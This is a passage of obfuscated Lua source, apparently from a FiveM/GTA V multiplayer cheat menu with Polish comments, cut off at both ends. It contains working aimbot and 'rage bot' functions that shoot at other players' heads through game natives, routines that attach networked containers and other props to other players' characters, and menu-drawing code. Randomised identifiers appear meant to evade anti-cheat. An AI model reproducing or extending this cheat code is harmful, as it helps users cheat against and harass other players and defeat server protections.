                            z_DSIHGSDGDSSDUHI = 12.6 - (2.25 * (i_SDGUIHSDUGSD + 1)),
                            _p_SDDSIHUGISDGSD = 90.0,
                            _y_SDDSIHUGISDGSD = 0.0,
                            _r_DSIGUHUSDIGSD = 0.0
                        }
                    end

                    for i_SDGUIHSDUGSD = 0, 3 do
                        arms_DSIGJSDGSDG["across_up"][i_SDGUIHSDUGSD + 1] = {
                            x_DSUHGISDG = -10.4,
                            y_DSUHGISDG = 0.0,
                            z_DSIHGSDGDSSDUHI = 11.6 + (2.6 * (i_SDGUIHSDUGSD + 1)),
                            _p_SDDSIHUGISDGSD = 90.0,
                            _y_SDDSIHUGISDGSD = 0.0,
                            _r_DSIGUHUSDIGSD = 0.0
                        }
                    end

                    local positions_DSIGHISDGSDG = {column_SJGHISDUGSDDSG["up"], column_SJGHISDUGSDDSG["across"], arms_DSIGJSDGSDG["bottom_right"], arms_DSIGJSDGSDG["across_up"], arms_DSIGJSDGSDG["top_left"], arms_DSIGJSDGSDG["across_down"]}
                    RequestModelSync_SDUFHSIDGSDG("prop_container_05a")

                    for _DSGISUDGSD, seg_SDGSDJKGSDG in pairs(positions_DSIGHISDGSDG) do
                        for _DSGISUDGSD, v_SDIGJOSDGSD in pairs(seg_SDGSDJKGSDG) do
                           local obj_DSUHGISDUGSDG = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "prop_container_05a"), where_DSUGHSIDUGSDG.x, where_DSUGHSIDUGSDG.y, where_DSUGHSIDUGSDG.z + (offZ_SDGUSDIGSD or 0), true, true, true)
                            DoNetwork_DSIGHISUDGSDG(obj_DSUHGISDUGSDG)
                            Czitirzen_Invoke(0x6B9BBD38AB0796DF, obj_DSUHGISDUGSDG, ent_DSIUHGIUSDGDS, Czitirzen_Invoke(0x524AC5ECEA15343E, ent_DSIUHGIUSDGDS) and GetPedBoneIndex_HugeV_DSGIHSDGSDG(ped_jgtirgirtjhilrthrth, 57005) or 0, v_SDIGJOSDGSD.x_DSUHGISDG, v_SDIGJOSDGSD.y_DSUHGISDG, v_SDIGJOSDGSD.z_DSIHGSDGDSSDUHI + (offZ_SDGUSDIGSD or 0), v_SDIGJOSDGSD._p_SDDSIHUGISDGSD, v_SDIGJOSDGSD._y_SDDSIHUGISDGSD, v_SDIGJOSDGSD._r_DSIGUHUSDIGSD, false, true, false, false, 1, true)
                            Czlowiek_Wait_IDYGOSIFJGDFG(80)
                        end
                    end
                end)
            end
			
 local function Dickens_hthukgrhuhughurhktrhuk(ent_ghjeruihtjrtrklh)

                CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
                    local manyCoTuSieRobi = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(ent_ghjeruihtjrtrklh, 0.0, 0.0, 0.0)

                    if not IsEntityAPed(ent_ghjeruihtjrtrklh) then
                        manyCoTuSieRobi = vector3(manyCoTuSieRobi.x, manyCoTuSieRobi.y, manyCoTuSieRobi.z + 5.0)
                    end

                    RequestModelSync_SDUFHSIDGSDG("stt_prop_stunt_bowling_ball")
                    local ball_l_KGKGKGKRGKR = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "stt_prop_stunt_bowling_ball"), manyCoTuSieRobi.x, manyCoTuSieRobi.y, manyCoTuSieRobi.z, true, true, true)
                    DoNetwork_DSIGHISUDGSDG(ball_l_KGKGKGKRGKR)
                    Czitirzen_Invoke(0x6B9BBD38AB0796DF, ball_l_KGKGKGKRGKR, ent_ghjeruihtjrtrklh, IsEntityAPed(ent_ghjeruihtjrtrklh) and GetPedBoneIndex(ped_jgtirgirtjhilrthrth, 57005) or 0, -3.0, 0, 0.0, 0.0, 0.0, 180.0, false, true, false, false, 1, true)
                    Wait(50)
                    local ball_r_JIKRIGERGHTUI = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "stt_prop_stunt_bowling_ball"), manyCoTuSieRobi.x, manyCoTuSieRobi.y, manyCoTuSieRobi.z, true, true, true)
                    DoNetwork_DSIGHISUDGSDG(ball_r_JIKRIGERGHTUI)
                    Czitirzen_Invoke(0x6B9BBD38AB0796DF, ball_r_JIKRIGERGHTUI, ent_ghjeruihtjrtrklh, IsEntityAPed(ent_ghjeruihtjrtrklh) and GetPedBoneIndex(ped_jgtirgirtjhilrthrth, 57005) or 0, 3.0, 0, 0.0, 0.0, 0.0, 0.0, false, true, false, false, 1, true)
                    Wait(50)
                    local shaft_FKRJGJRGJR = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "prop_container_ld2"), manyCoTuSieRobi.x, manyCoTuSieRobi.y, manyCoTuSieRobi.z, true, true, true)
                    DoNetwork_DSIGHISUDGSDG(shaft_FKRJGJRGJR)
                    Czitirzen_Invoke(0x6B9BBD38AB0796DF, shaft_FKRJGJRGJR, ent_ghjeruihtjrtrklh, IsEntityAPed(ent_ghjeruihtjrtrklh) and GetPedBoneIndex(ped_jgtirgirtjhilrthrth, 57005) or 0, -1.5, 0, 5.0, 90.0, 0, 90.0, false, true, false, false, 1, true)
                    Wait(50)
                end)
            end
			

local function AddVectors_HugeV_DUHFIUDSHGFDG(to_vector_1_IDUHGISJGFDG, to_vector_2_DOIHGIUOSDGRF)
return vector3(to_vector_1_IDUHGISJGFDG.x + to_vector_2_DOIHGIUOSDGRF.x, to_vector_1_IDUHGISJGFDG.y + to_vector_2_DOIHGIUOSDGRF.y, to_vector_1_IDUHGISJGFDG.z + to_vector_2_DOIHGIUOSDGRF.z)
end

local shooted_DSUGHUDSGSD = false

local function aimbot_shoot_SUGUYFSDHIFDG(target_udhsgidgsdfg, bone_udhgsiugsdfgsre, damage_dighsdiugsdfgr)
if shooted_DSUGHUDSGSD then
-- nic
else
		local boneTarget_UDHGIHDUFIURDFG = GetPedBoneCoords_HugeV_GDUYFSDGF(target_udhsgidgsdfg, GetEntityBoneIndexByName(target_udhsgidgsdfg, "SKEL_HEAD"), 0.0, 0.0, 0.0)
		local _, weapon_IDHIFUSDGFDG = GetCurrentPedWeapon_HugeV_UDIUGHUSGFD(Czitirzen_Invoke(0xD80958FC74E988A6))
		Czitirzen_Invoke(0x867654CBC7606F2C, AddVectors_HugeV_DUHFIUDSHGFDG(boneTarget_UDHGIHDUFIURDFG, vector3(0, 0, 0.1)), boneTarget_UDHGIHDUFIURDFG, damage_dighsdiugsdfgr, true, weapon_IDHIFUSDGFDG, Czitirzen_Invoke(0xD80958FC74E988A6), true, true, 1000.0)
		shooted_DSUGHUDSGSD = true
		Czlowiek_Wait_IDYGOSIFJGDFG(500)
		shooted_DSUGHUDSGSD = false
	end
end

local function rage_bot_shoot_SUGUYFSDHIFDG(target_udhsgidgsdfg, bone_udhgsiugsdfgsre, damage_dighsdiugsdfgr)
    local boneTarget_UDHGIHDUFIURDFG = GetPedBoneCoords_HugeV_GDUYFSDGF(target_udhsgidgsdfg, GetEntityBoneIndexByName(target_udhsgidgsdfg, "SKEL_HEAD"), 0.0, 0.0, 0.0)
    local _, weapon_IDHIFUSDGFDG = GetCurrentPedWeapon_HugeV_UDIUGHUSGFD(Czitirzen_Invoke(0xD80958FC74E988A6))
    Czitirzen_Invoke(0x867654CBC7606F2C, AddVectors_HugeV_DUHFIUDSHGFDG(boneTarget_UDHGIHDUFIURDFG, vector3(0, 0, 0.1)), boneTarget_UDHGIHDUFIURDFG, damage_dighsdiugsdfgr, true, weapon_IDHIFUSDGFDG, Czitirzen_Invoke(0xD80958FC74E988A6), true, true, 1000.0)
end

local function legit_aimbot_UGDUYFHDSIGKHUIDFGDFG(player_duhfiudshgisdf)
    if Czitirzen_Invoke(0xE659E47AF827484B, player_duhfiudshgisdf) and not Czitirzen_Invoke(0x3317DEDB88C95038, player_duhfiudshgisdf) and Czitirzen_Invoke(0xE2587F8CBBD87B1D, 0, 24) and Czitirzen_Invoke(0xE2587F8CBBD87B1D, 0, 38) and Czitirzen_Invoke(0x2E397FD2ECD37C87, Czitirzen_Invoke(0x4F8644AF03D0E0D6)) then
        local x_dgjodisgpdsfg, y_diughodsgdsfg, z_duhgaufydshigsdfg = table.unpack(GetEntityCoords_HugeV_UDHGIUDIKGDFG(player_duhfiudshgisdf))
        local _, _x_ADIFJIDSGJDSIGISDGSD, _y_SDDSIHUGISDGSD = World3dToScreen2d_Hugev_UDHUGIDFGDF(x_dgjodisgpdsfg, y_diughodsgdsfg, z_duhgaufydshigsdfg)
        if _x_ADIFJIDSGJDSIGISDGSD > fov_x_DISFISDUSGFDG and _x_ADIFJIDSGJDSIGISDGSD < fov_x2_DISFISDUSGFDG and _y_SDDSIHUGISDGSD > fov_y_DISFISDUSGFDG and _y_SDDSIHUGISDGSD < fov_y2_DISFISDUSGFDG then
            local _, weapon_IDHIFUSDGFDG = GetCurrentPedWeapon_HugeV_UDIUGHUSGFD(Czitirzen_Invoke(0xD80958FC74E988A6))
            aimbot_shoot_SUGUYFSDHIFDG(player_duhfiudshgisdf, "SKEL_HEAD", 200)
        end
    end
end

local function rage_bot_UGDUYFHDSIGKHUIDFGDFG(player_duhfiudshgisdf)
    if not Czitirzen_Invoke(0x3317DEDB88C95038, player_duhfiudshgisdf) then
        local x_dgjodisgpdsfg, y_diughodsgdsfg, z_duhgaufydshigsdfg = table.unpack(GetEntityCoords_HugeV_UDHGIUDIKGDFG(player_duhfiudshgisdf))
        local _, _x_ADIFJIDSGJDSIGISDGSD, _y_SDDSIHUGISDGSD = World3dToScreen2d_Hugev_UDHUGIDFGDF(x_dgjodisgpdsfg, y_diughodsgdsfg, z_duhgaufydshigsdfg)
        if _x_ADIFJIDSGJDSIGISDGSD > fov_x_DISFISDUSGFDG and _x_ADIFJIDSGJDSIGISDGSD < fov_x2_DISFISDUSGFDG and _y_SDDSIHUGISDGSD > fov_y_DISFISDUSGFDG and _y_SDDSIHUGISDGSD < fov_y2_DISFISDUSGFDG then
            local _, weapon_IDHIFUSDGFDG = GetCurrentPedWeapon_HugeV_UDIUGHUSGFD(Czitirzen_Invoke(0xD80958FC74E988A6))
            rage_bot_shoot_SUGUYFSDHIFDG(player_duhfiudshgisdf, "", GetWeaponDamage_HugeV_SDGHSDUGDS(weapon_IDHIFUSDGFDG, 1))
        end
    end
end

local function RandomOutfit_HugeV_HAHERHGKDHFUFDHSGIUHDFIGDF()
    local Co_to_te_uGEHTHRT_lol = Czitirzen_Invoke(0x43A66C31C68491C0, -1)
    Czitirzen_Invoke(0xC8A9481A01E63C28, Co_to_te_uGEHTHRT_lol, false)
    Czitirzen_Invoke(0xC44AA05345C992C6, Co_to_te_uGEHTHRT_lol)
end

-- Zmienne globalne

local menus_ueygtyuerihgkbergerg = { }

local keys_dhgiuerhgoelgiehwgewg = { up_key_dhugiuerger = 188, down_key_dhugiuerger = 187, left_key_dhugiuerger = 189, right_key_dhugiuerger = 190, select_key_dhugiuerger = 201, back_key_dhugiuerger = 202 }

local optionCount_eygfuwengjiebigoer = 0

-- CurrentKey i_HUGHUTKHJTRHRTH CurrentMenu (Nie zmieniaj nic tyle ci wystarczy xd)
local currentKey_hgiuerhiogewger = nil
local currentMenu_dygfuyeikesrgerg = nil
---------------------------------------------------------------------------------------

-- Zmienne do title (wysokość itp)
local titleHeight_iudygiuehoguergerg = 0.11
local titleYOffset_rwe6rqtyhfiehguerwg = 0.03
local titleScale_diufiegergnergewg = 1.0
---------------------------------------------------------------------------------------

-- Zmienne do buttonów (wysokośc itp)
local buttonHeight_polcijahugiueshrguerlge = 0.028
local buttonFont_poidofjeughoeigienwir = 4
local buttonScale_kurwamissclick_ghrueghrekrkeu = 0.305
local buttonTextXOffset_ydtfuewkhjbeisoger = 0.005
local buttonTextYOffset_ydtufebklergegew = 0.005
---------------------------------------------------------------------------------------

local Wlaczone_Menu_XD_dugao8iugsgsergsdfg = true -- Czy menu jest włączone

local discordPresence_YFGUIFSFEWYKUFYDSFF = false

local watermark_hugev_dugshdioufgsdf = false

spectate_global_dugsuydhkgsdfgdf = false

-- Wszystkie bronie
local Wszystkie_Bronie_Umnie_duaghoidfgdf = {
    "PISTOL",
    "PISTOL_MK2",
    "COMBATPISTOL",
    "APPISTOL",
    "REVOLVER",
    "REVOLVER_MK2",
    "DOUBLEACTION",
    "PISTOL50",
    "SNSPISTOL",
    "SNSPISTOL_MK2",
    "HEAVYPISTOL",
    "VINTAGEPISTOL",
    "STUNGUN",
    "FLAREGUN",
    "MARKSMANPISTOL",
    "KNIFE",
    "KNUCKLE",
    "NIGHTSTICK",
    "HAMMER",
    "BAT",
    "GOLFCLUB",
    "CROWBAR",
    "BOTTLE",
    "DAGGER",
    "HATCHET",
    "MACHETE",
    "FLASHLIGHT",
    "SWITCHBLADE",
    "POOLCUE",
    "PIPEWRENCH",
    "MICROSMG",
    "MINISMG",
    "SMG",
    "SMG_MK2",
    "ASSAULTSMG",
    "COMBATPDW",
    "GUSENBERG",
    "MACHINEPISTOL",
    "MG",
    "COMBATMG",
    "COMBATMG_MK2",
    "ASSAULTRIFLE",
    "ASSAULTRIFLE_MK2",
    "CARBINERIFLE",
    "CARBINERIFLE_MK2",
    "ADVANCEDRIFLE",
    "SPECIALCARBINE",
    "SPECIALCARBINE_MK2",
    "BULLPUPRIFLE",
    "BULLPUPRIFLE_MK2",
    "COMPACTRIFLE",
    "PUMPSHOTGUN",
    "PUMPSHOTGUN_MK2",
    "SWEEPERSHOTGUN",
    "SAWNOFFSHOTGUN",
    "BULLPUPSHOTGUN",
    "ASSAULTSHOTGUN",
    "MUSKET",
    "HEAVYSHOTGUN",
    "DBSHOTGUN",
    "SNIPERRIFLE",
    "HEAVYSNIPER",
    "HEAVYSNIPER_MK2",
    "MARKSMANRIFLE",
    "MARKSMANRIFLE_MK2",
    "GRENADELAUNCHER",
    "GRENADELAUNCHER_SMOKE",
    "RPG",
    "MINIGUN",
    "FIREWORK",
    "RAILGUN",
    "HOMINGLAUNCHER",
    "COMPACTLAUNCHER",
    "GRENADE",
    "STICKYBOMB",
    "PROXMINE",
    "BZGAS",
    "SMOKEGRENADE",
    "MOLOTOV",
    "FIREEXTINGUISHER",
    "PETROLCAN",
    "SNOWBALL",
    "FLARE",
    "BALL"
}
---------------------------------------------------------------------------------------

-- Wszystkie propy
local props_IDHSOGLFDSKGDUHIOSSD = {
"hei_prop_carrier_radar_1",
"hei_prop_carrier_defense_02",
"hei_prop_mini_sever_02",
"hei_prop_ss1_mpint_door_l",
"lts_prop_lts_elecbox_24",
"lts_prop_lts_elecbox_24b",
"p_armchair_01_s",
"p_beefsplitter_s",
"p_cablecar_s",
"p_crahsed_heli_s",
"p_cs_mp_jet_01_s",
"p_gate_prison_01_s",
"vp_ld_coffee_vend_01",
"p_lestersbed_s",
"p_lev_sofa_s",
"p_med_jet_01_s",
"p_mbbed_s",
"p_new_j_counter_03",
"p_oil_pjack_02_s",
"p_oil_pjack_03_s",
"p_tram_crash_s",
"p_v_med_p_sofa_s",
"p_v_res_tt_bed_s",
"prop_barrel_pile_01",
"prop_air_generator_03",
"prop_air_sechut_01",
"prop_aircon_l_01",
"prop_aircon_m_10",
"prop_aircon_tna_02",
"prop_asteroid_01",
"prop_barier_conc_05c",
"prop_barrel_pile_01",
"prop_bbq_3",
"prop_bench_03",
"prop_bh1_09_mp_gar",
"prop_big_cin_screen",
"prop_biolab_g_door",
"prop_bleachers_05_cr",
"prop_bmu_02_ld",
"prop_box_wood04a",
"prop_boxpile_02b",
"prop_boxpile_07a",
"prop_bumper_04",
"prop_bush_lrg_01e_cr2",
"prop_bush_lrg_01c_cr",
"prop_busstop_04",
"prop_byard_dingy",
"prop_byard_floatpile",
"prop_byard_rowboat1",
"prop_cablespool_03",
"prop_car_battery_01",
"prop_cash_crate_01",
"prop_cctv_unit_01",
"prop_cementbags01",
"prop_ch2_05d_g_door",
"prop_cleaning_trolly",
"prop_coffin_01",
"prop_coffin_02b",
"prop_com_gar_door_01",
"prop_com_ls_door_01"
}

local props_one_DSUHGIUDSGSDG = {
["Radar"] = "hei_prop_carrier_radar_1",
["Defense Carrier"] = "hei_prop_carrier_defense_02",
["Mini Server"] = "hei_prop_mini_sever_02",
["Gate"] = "hei_prop_ss1_mpint_door_l",
["Gate (2)"] = "prop_bh1_09_mp_gar",
["Gate (3)"] = "prop_biolab_g_door",
["Electric Box"] = "lts_prop_lts_elecbox_24",
["Electric Box (2)"] = "lts_prop_lts_elecbox_24b",
["Armchair"] = "p_armchair_01_s",
["Beef Spliter"] = "p_beefsplitter_s",
["Cable Car"] = "p_cablecar_s",
["Crashed Helicopter"] = "p_crahsed_heli_s",
["Plane"] = "p_cs_mp_jet_01_s",
["Plane (2)"] = "p_med_jet_01_s",
["Prison Gate"] = "p_gate_prison_01_s",
["Coffe Vend"] = "p_ld_coffee_vend_01",
["Lester bed"] = "p_lestersbed_s",
["Sofa"] = "p_lev_sofa_s",
["Sofa (2)"] = "p_v_med_p_sofa_s",
["Bed"] = "p_mbbed_s",
["Bed (2)"] = "p_v_res_tt_bed_s",
["Jewerly Counter"] = "p_new_j_counter_03",
["Oil Machine"] = "p_oil_pjack_02_s",
["Oil Machine (2)"] = "p_oil_pjack_03_s",
["Tram Crashed"] = "p_tram_crash_s",
["Barrels"] = "prop_barrel_pile_01",
["Security Room"] = "prop_air_sechut_01",
["Asteroid"] = "prop_asteroid_01",
["Barier"] = "prop_barier_conc_05c",
["Bench"] = "prop_bench_03",
["Big Screen"] = "prop_big_cin_screen",
["Wood Box"] = "prop_box_wood04a",
["Bush"] = "prop_bush_lrg_01e_cr2",
["Bush (2)"] = "prop_bush_lrg_01c_cr",
["Bus Stop"] = "prop_busstop_04",
["Cash Crate"] = "prop_cash_crate_01",
["Cement Bags"] = "prop_cementbags01"
}

local flags_DHDSIUHGIUSDHGSD = {
["Canada"] = "prop_flag_canada",
["Europe"] = "prop_flag_eu",
["France"] = "prop_flag_france",
["Germany"] = "prop_flag_german",
["Ireland"] = "prop_flag_ireland",
["Japan"] = "prop_flag_japan",
["Los Santos"] = "prop_flag_ls",
["L.S.F.D"] = "prop_flag_lsfd",
["Los Santos Services"] = "prop_flag_lsservices",
["Mexico"] = "prop_flag_mexico",
["Russia"] = "prop_flag_russia",
["S.A"] = "prop_flag_sa",
["S.A.P.D"] = "prop_flag_sapd",
["Scotland"] = "prop_flag_scotland",
["Sheriff"] = "prop_flag_sheriff",
["United Kingdom"] = "prop_flag_uk",
["United States"] = "prop_flag_us",
["Golf"] = "prop_golfflag"
}

---------------------------------------------------------------------------------------



-- Podstawa --
local function setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, property_duhgiusdrlgssd, value_dkjgisoedfg)
	if id_jdhgisrejolger and menus_ueygtyuerihgkbergerg[id_jdhgisrejolger] then
		menus_ueygtyuerihgkbergerg[id_jdhgisrejolger][property_duhgiusdrlgssd] = value_dkjgisoedfg
	end
end


local function isMenuVisible_trdyugfwgewiubfbeierg(id_jdhgisrejolger)
	if id_jdhgisrejolger and menus_ueygtyuerihgkbergerg[id_jdhgisrejolger] then
		return menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].visible_udhgiusodlgesdf
	else
		return false
	end
end


local function setMenuVisible_eqwreqtyhfioewjfiuewg(id_jdhgisrejolger, visible_udhgiusodlgesdf, holdCurrent_duhgsiolgesdfg)
	if id_jdhgisrejolger and menus_ueygtyuerihgkbergerg[id_jdhgisrejolger] then
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'visible_udhgiusodlgesdf', visible_udhgiusodlgesdf)

		if not holdCurrent_duhgsiolgesdfg and menus_ueygtyuerihgkbergerg[id_jdhgisrejolger] then
			setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'currentOption_duhfislerjgilsedfg', 1)
		end

		if visible_udhgiusodlgesdf then
			if id_jdhgisrejolger ~= currentMenu_dygfuyeikesrgerg and isMenuVisible_trdyugfwgewiubfbeierg(currentMenu_dygfuyeikesrgerg) then
				setMenuVisible_eqwreqtyhfioewjfiuewg(currentMenu_dygfuyeikesrgerg, false)
			end

			currentMenu_dygfuyeikesrgerg = id_jdhgisrejolger
		end
	end
end


local function drawText_udgyuiergeirgeg(text_duhgilserg, x_dhgiuslergssdfg, y_dhgiuslergssdfg, font_ifhgiuslrgsdfg, color_fjgoisrgdfg, scale_digjiusjeriogsfg, center_dhgusirdfg, shadow_dhugiusergsdfg, alignRight_76497tjiosdfjgsregdsf)
	Czitirzen_Invoke(0xBE6B23FFA53FB442, color_fjgoisrgdfg.r_djguisernglse, color_fjgoisrgdfg.g_IDJGIODSF, color_fjgoisrgdfg.b_djguisernglse, color_fjgoisrgdfg.a_djguisernglse)
	Czitirzen_Invoke(0x66E0276CC5F6B9DA, font_ifhgiuslrgsdfg)
	Czitirzen_Invoke(0x07C837F9A01C34C9, scale_digjiusjeriogsfg, scale_digjiusjeriogsfg)

	if shadow_dhugiusergsdfg then
		Czitirzen_Invoke(0x465C84BC39F1C351, 2, 2, 0, 0, 0)
	end

	local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]
	if menu_idhgisjlofdgsersdfgsegdf then
		if center_dhgusirdfg then
			Czitirzen_Invoke(0xC02F4DBFB51D988B, center_dhgusirdfg)
		elseif alignRight_76497tjiosdfjgsregdsf then
			Czitirzen_Invoke(0x63145D9C883A1A70, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf - buttonTextXOffset_ydtfuewkhjbeisoger)
			Czitirzen_Invoke(0x6B3C4650BC8BEE47, true)
		end
	end

	Czitirzen_Invoke(0x25FBB336DF1804CB, "STRING")
	Czitirzen_Invoke(0x94CF4AC034C9C986, tostring(text_duhgilserg))
	Czitirzen_Invoke(0xCD015E5BB0D96A57, x_dhgiuslergssdfg, y_dhgiuslergssdfg)
end

local function drawRect_ytfuewgifygbkinbguyierlgeg(x_dhgiuslergssdfg, y_dhgiuslergssdfg, width_duhgsiuerlgsdf, height_dihguisgdgdf, color_fjgoisrgdfg)
	Czitirzen_Invoke(0x3A618A217E5154F0, x_dhgiuslergssdfg, y_dhgiuslergssdfg, width_duhgsiuerlgsdf, height_dihguisgdgdf, color_fjgoisrgdfg.r_djguisernglse, color_fjgoisrgdfg.g_IDJGIODSF, color_fjgoisrgdfg.b_djguisernglse, color_fjgoisrgdfg.a_djguisernglse)
end

local function DrawTxt_fsd7g8reuigsdf(text_dughisergdfdg, x_dygs8dfuijgk4, y_duhg8suoeirg, scale_f8ghsiupoged, size_duyg87seruigsd)
    Czitirzen_Invoke(0x66E0276CC5F6B9DA, 0)
    Czitirzen_Invoke(0x038C1F517D7FDCF8, 1)
    Czitirzen_Invoke(0x07C837F9A01C34C9, scale_f8ghsiupoged, size_duyg87seruigsd)
    Czitirzen_Invoke(0x465C84BC39F1C351, 1, 0, 0, 0, 255)
    Czitirzen_Invoke(0x441603240D202FA6, 1, 0, 0, 0, 255)
    Czitirzen_Invoke(0x1CA3E9EAC9D93E5E)
    Czitirzen_Invoke(0x2513DFB0FB8400FE) 
    Czitirzen_Invoke(0x25FBB336DF1804CB, "STRING")
    Czitirzen_Invoke(0x94CF4AC034C9C986, text_dughisergdfdg)
    Czitirzen_Invoke(0xCD015E5BB0D96A57, x_dygs8dfuijgk4, y_duhg8suoeirg)
end

local function drawTitle_ufhgiuehgunesiough()
	local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]
	if menu_idhgisjlofdgsersdfgsegdf then
		local x = menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf / 2
		local y = menu_idhgisjlofdgsersdfgsegdf.y_dhgiuslergssdfg + titleHeight_iudygiuehoguergerg / 2

		if menu_idhgisjlofdgsersdfgsegdf.titleBackgroundSprite_udyguiosrser3445r3 then
			Czitirzen_Invoke(0xE7FFAE5EBF23D890, menu_idhgisjlofdgsersdfgsegdf.titleBackgroundSprite_udyguiosrser3445r3.dict_jdhgiusrjlger, menu_idhgisjlofdgsersdfgsegdf.titleBackgroundSprite_udyguiosrser3445r3.name_idgjiserjios, x, y, menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf, titleHeight_iudygiuehoguergerg, 0., 255, 255, 255, 255)
		else
			drawRect_ytfuewgifygbkinbguyierlgeg(x, y, menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf, titleHeight_iudygiuehoguergerg, menu_idhgisjlofdgsersdfgsegdf.titleBackgroundColor_7567fihfsudgdsf)
		end

		drawText_udgyuiergeirgeg(menu_idhgisjlofdgsersdfgsegdf.title_duhgilgsegdfg, x, y - titleHeight_iudygiuehoguergerg / 2 + titleYOffset_rwe6rqtyhfiehguerwg, menu_idhgisjlofdgsersdfgsegdf.titleFont_dnguseridf, menu_idhgisjlofdgsersdfgsegdf.titleColor_diuhgauesd, titleScale_diufiegergnergewg, true)
	end
end


local function drawSubTitle_ydtufgekhbghskdnlgjrnei()
	local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]
	if menu_idhgisjlofdgsersdfgsegdf then
		local x_dhgiuslergssdfg = menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf / 2
		local y_dhgiuslergssdfg = menu_idhgisjlofdgsersdfgsegdf.y_dhgiuslergssdfg + titleHeight_iudygiuehoguergerg + buttonHeight_polcijahugiueshrguerlge / 2

		local subTitleColor_dihgiusergsdfg = { r_djguisernglse = menu_idhgisjlofdgsersdfgsegdf.titleBackgroundColor_7567fihfsudgdsf.r_djguisernglse, g_IDJGIODSF = menu_idhgisjlofdgsersdfgsegdf.titleBackgroundColor_7567fihfsudgdsf.g_IDJGIODSF, b_djguisernglse = menu_idhgisjlofdgsersdfgsegdf.titleBackgroundColor_7567fihfsudgdsf.b_djguisernglse, a_djguisernglse = 255 }

		drawRect_ytfuewgifygbkinbguyierlgeg(x_dhgiuslergssdfg, y_dhgiuslergssdfg, menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf, buttonHeight_polcijahugiueshrguerlge, menu_idhgisjlofdgsersdfgsegdf.subTitleBackgroundColor_duhgsiuorsgsdf)
		drawText_udgyuiergeirgeg(menu_idhgisjlofdgsersdfgsegdf.subTitle_duhgiuesrjogse, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg+0.003 - buttonHeight_polcijahugiueshrguerlge / 2 + buttonTextYOffset_ydtufebklergegew - 0.005, buttonFont_poidofjeughoeigienwir, subTitleColor_dihgiusergsdfg, buttonScale_kurwamissclick_ghrueghrekrkeu, false)

		if optionCount_eygfuwengjiebigoer > menu_idhgisjlofdgsersdfgsegdf.maxOptionCount_djgiusriuogsedsfg then
			drawText_udgyuiergeirgeg(tostring(menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg)..'/ '..tostring(optionCount_eygfuwengjiebigoer), menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf, y_dhgiuslergssdfg - buttonHeight_polcijahugiueshrguerlge / 2 + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, subTitleColor_dihgiusergsdfg, buttonScale_kurwamissclick_ghrueghrekrkeu, false, false, true)
		end
	end
end

local txtRatio_DSHGDSIUGSDG = {}
local ratio_DSGIHSDIUGSDG = GetAspectRatio_HugeV_DSHUGHSIDG(true)
local mult_DSGHSDUIGSDG = 10^3

local function DrawSpriteScaled_DSGIDSIUGISDGDS(textureDict_SDGHSIUDGSDG, textureName_DSGUHSDUGHIUDS, screenX_DSGUHSDUIGSDG, screenY_SDGHDSIGSDG, width_SDIGHSUIDGSDG, height_SDGHDSIUGSDG, heading, red, green, blue, alpha)
    local index_DSGUHISUDGSD = tostring(textureName_DSGUHSDUGHIUDS)

    if not txtRatio_DSHGDSIUGSDG[index_DSGUHISUDGSD] then
        txtRatio_DSHGDSIUGSDG[index_DSGUHISUDGSD] = {}
        local res_DSUGHSDIUGSDG = GetTextureResolution_HugeV_SDIGSIDJGIDS(textureDict_SDGHSIUDGSDG, textureName_DSGUHSDUGHIUDS)

        txtRatio_DSHGDSIUGSDG[index_DSGUHISUDGSD].ratio_DSGIHSDIUGSDG = (res_DSUGHSDIUGSDG[2] / res_DSUGHSDIUGSDG[1])
        txtRatio_DSHGDSIUGSDG[index_DSGUHISUDGSD].height_SDGHDSIUGSDG = math.floor(((width_SDIGHSUIDGSDG * txtRatio_DSHGDSIUGSDG[index_DSGUHISUDGSD].ratio_DSGIHSDIUGSDG) * ratio_DSGIHSDIUGSDG) * mult_DSGHSDUIGSDG + 0.5) / mult_DSGHSDUIGSDG
        Czitirzen_Invoke(0xE7FFAE5EBF23D890, textureDict_SDGHSIUDGSDG, textureName_DSGUHSDUGHIUDS, screenX_DSGUHSDUIGSDG, screenY_SDGHDSIGSDG, width_SDIGHSUIDGSDG, txtRatio_DSHGDSIUGSDG[index_DSGUHISUDGSD].height_SDGHDSIUGSDG, heading, red, green, blue, alpha)
    end

